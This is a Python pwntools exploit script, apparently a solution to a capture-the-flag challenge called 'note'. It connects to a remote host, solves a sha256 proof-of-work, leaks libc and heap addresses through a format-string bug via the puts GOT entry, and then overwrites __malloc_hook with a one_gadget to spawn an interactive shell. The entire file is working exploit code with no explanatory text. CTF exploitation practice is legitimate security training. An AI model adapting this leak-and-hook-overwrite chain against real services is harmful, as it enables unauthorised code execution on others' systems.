#*ctf{n0te_helps_y0u_use_scanf}
from pwn import *
from hashlib import sha256
import itertools
#context.log_level = 'debug'
#context.terminal = ['tmux', 'sp', '-h']

#io = process('./note')
debug = 0
libc = ELF('libc.so.6')
io = remote('47.89.18.224', 10007)
#libc = ELF('./libc.so.6')
#47.89.18.224 10007
def Edit(content):
	io.recvuntil('> ')
	io.sendline('1')
	io.recvuntil('Note:')
	io.sendline(content)

def Show():
	io.recvuntil('> ')
	io.sendline('2')

def Save():
	io.recvuntil('> ')
	io.sendline('3')

def Change():
	io.recvuntil('> ')
	io.sendline('4')


if debug==0:
    io.recvuntil('sha256(xxxx+')
    
    s=string.letters+string.digits

    chal=io.recv(16)
    io.recvuntil(') == ')
    t=io.recv(64)
    print(chal)
    print(t)
    io.recvuntil('Give me xxxx:')
    for i in itertools.permutations(s,4):
        sol=''.join(i)
        if sha256(sol+chal).hexdigest()==t:
            break
    io.send(sol)

io.recvuntil('ID:')
io.sendline('111111')

format_addr = 0x401129
payload = '%7$s'
payload = payload.ljust(0xa8, '\x00')
payload += p64(format_addr)
payload += p64(0)	
payload = payload.ljust(0x100, '\x00')
Edit(payload)

io.recvuntil('> ')

puts_got = 0x601F90
payload = p32(2)	
payload += p64(format_addr)
payload += p64(puts_got)
io.sendline(payload)

io.recvuntil('Note:')
content = io.recvn(6)
libc_base = u64(content.ljust(8, '\x00')) - libc.symbols['puts']
log.info('libc_base = ' + hex(libc_base))

io.recvuntil('> ')

stream_addr = 0x602140
payload = p32(2)			
payload += p64(format_addr)	
payload += p64(stream_addr)	
io.sendline(payload)

io.recvuntil('Note:')
content = io.recvline()[:-1]
heap_base = u64(content.ljust(8, '\x00'))
log.info('heap_base = ' + hex(heap_base))

io.recvuntil('> ')

format2_addr = heap_base + 0x1260
malloc_hook = libc_base + libc.symbols['__malloc_hook']
payload = p32(1)		
payload += p64(format2_addr)
payload += p64(0) * 11
payload += p64(0x400ea1)
payload += p64(0)
payload += p64(malloc_hook)

io.sendline(payload)

one_gadget = libc_base + 0xf1147
payload = p64(one_gadget)
io.sendline(payload)

io.sendline('AA')

io.interactive()
